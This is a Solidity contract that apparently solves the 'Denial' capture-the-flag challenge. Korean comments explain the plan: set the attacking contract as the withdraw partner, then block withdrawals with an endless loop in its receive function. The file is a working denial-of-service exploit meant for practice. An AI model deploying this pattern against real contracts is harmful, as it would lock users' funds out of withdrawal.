// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 목표
 * withdraw 함수를 사용 불가한 상태로 만들기
 * 
 * 공격 방식
 * 1. setWithdrawPartner 함수를 이용하여 공격용 CA 주소를 Partner로 지정
 * 2. 공격용 CA 컨트랙트에서 receive 함수에 while(true) 지정하여 DoS 공격하도록 설정
 */

interface Denial {
    function setWithdrawPartner(address) external;
    function withdraw() external;
    function contractBalance() external returns (uint256);
}

contract Solve {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        Denial(target).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true) {}
    }
}